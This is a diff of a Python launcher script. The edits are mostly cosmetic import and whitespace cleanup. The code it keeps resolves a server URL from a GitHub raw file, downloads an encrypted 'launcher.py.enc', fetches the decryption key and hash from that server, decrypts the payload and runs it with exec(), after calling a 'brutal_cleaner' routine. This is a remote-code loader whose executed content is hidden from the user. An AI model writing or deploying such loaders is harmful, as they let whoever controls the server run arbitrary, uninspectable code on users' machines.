@@ -6,20 +6,8 @@ from colorama import Fore, init
 import os
 import shutil
 import hashlib
-import requests
 from cryptography.fernet import Fernet
-
-import uuid  # noqa: F401
-import platform  # noqa: F401
-import socket  # noqa: F401
-import json  # noqa: F401
-import gzip  # noqa: F401
-import zlib  # noqa: F401
-import base64  # noqa: F401
-import importlib.util  # noqa: F401
-import random  # noqa: F401
-import gc  # noqa: F401
-import inspect  # noqa: F401
+import requests
 
 
 def get_pip_cmd():
@@ -86,7 +74,6 @@ def pip_cache_clean():
 
 
 init(autoreset=True)
-
 LAUNCHER_URLS = ["https://raw.githubusercontent.com/LIVEXORD/url/refs/heads/main/launcher.py.enc"]
 SERVER_URL_SOURCE = "https://raw.githubusercontent.com/LIVEXORD/url/refs/heads/main/url.txt"
 
@@ -134,7 +121,7 @@ def fetch_launcher_meta(server_url, max_retry=5):
             enc_key = data.get("enc_key")
             if not sha256 or not enc_key:
                 raise Exception("meta is empty / not yet published by server")
-            return sha256, enc_key, data.get("version", "unknown")
+            return (sha256, enc_key, data.get("version", "unknown"))
         except Exception as e:
             if attempt >= max_retry:
                 break
@@ -165,27 +152,22 @@ def main():
     ensure_env()
     brutal_cleaner()
     pip_cache_clean()
-
     log("🌐 Resolving server URL...", Fore.CYAN)
     server_url = fetch_server_url()
-
     log("🔑 Fetching launcher integrity metadata...", Fore.CYAN)
     expected_hash, enc_key, version = fetch_launcher_meta(server_url)
-
     ciphertext = fetch_launcher_ciphertext()
     try:
         plaintext_bytes = Fernet(enc_key.encode()).decrypt(ciphertext.encode())
     except Exception as e:
         log(f"❌ Failed to decrypt launcher: {e}", Fore.RED)
         os._exit(1)
-
     source = plaintext_bytes.decode("utf-8")
     actual_hash = hashlib.sha256(source.encode()).hexdigest()
     if actual_hash != expected_hash:
         time.sleep(2)
         log("❌ Integrity check failed", Fore.RED)
         os._exit(1)
-
     log(f"🚀 Running launcher v{version}...\n", Fore.MAGENTA)
     exec(source, {"__name__": "__main__"})
 
